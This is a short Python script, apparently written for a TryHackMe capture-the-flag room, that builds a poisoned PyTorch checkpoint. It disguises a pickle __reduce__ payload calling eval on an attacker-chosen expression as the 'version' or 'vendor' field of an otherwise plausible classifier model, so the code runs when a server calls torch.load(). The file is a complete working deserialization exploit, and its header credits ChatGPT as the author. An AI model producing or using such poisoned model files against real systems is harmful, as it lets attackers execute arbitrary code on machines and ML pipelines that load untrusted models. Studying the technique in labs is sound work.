# make_torch_probe.py
# script by ChatGPT
# script for TryHackMe room Cypheron Task 1 https://tryhackme.com/room/cypheron
# YouTube video walk through: https://youtu.be/P_sUtfPP_pM

import argparse
import torch


class EvalPayload:
    def __init__(self, expr):
        self.expr = expr

    def __reduce__(self):
        # Runs on the server during torch.load()
        return (eval, (self.expr,))


def build_state_dict():
    return {
        "_calibration_constants": torch.zeros((24,), dtype=torch.uint8),

        "feature_extractor.0.weight": torch.zeros((64, 16), dtype=torch.float32),
        "feature_extractor.0.bias": torch.zeros((64,), dtype=torch.float32),

        "feature_extractor.2.weight": torch.zeros((32, 64), dtype=torch.float32),
        "feature_extractor.2.bias": torch.zeros((32,), dtype=torch.float32),

        "classifier.weight": torch.zeros((2, 32), dtype=torch.float32),
        "classifier.bias": torch.zeros((2,), dtype=torch.float32),
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--field", choices=["vendor", "version"], default="version")
    parser.add_argument("--expr", required=True)
    parser.add_argument("-o", "--output", default="torch_probe.pt")
    args = parser.parse_args()

    artifact = {
        "state_dict": build_state_dict(),
        "feature_mean": [0.0] * 16,
        "feature_std": [1.0] * 16,
        "num_features": 16,
        "vendor": "Oracle 9 Labs",
        "version": "signal-classifier-v1.4.2",
    }

    artifact[args.field] = EvalPayload(args.expr)

    torch.save(artifact, args.output)
    print(f"[+] wrote {args.output}")


if __name__ == "__main__":
    main()
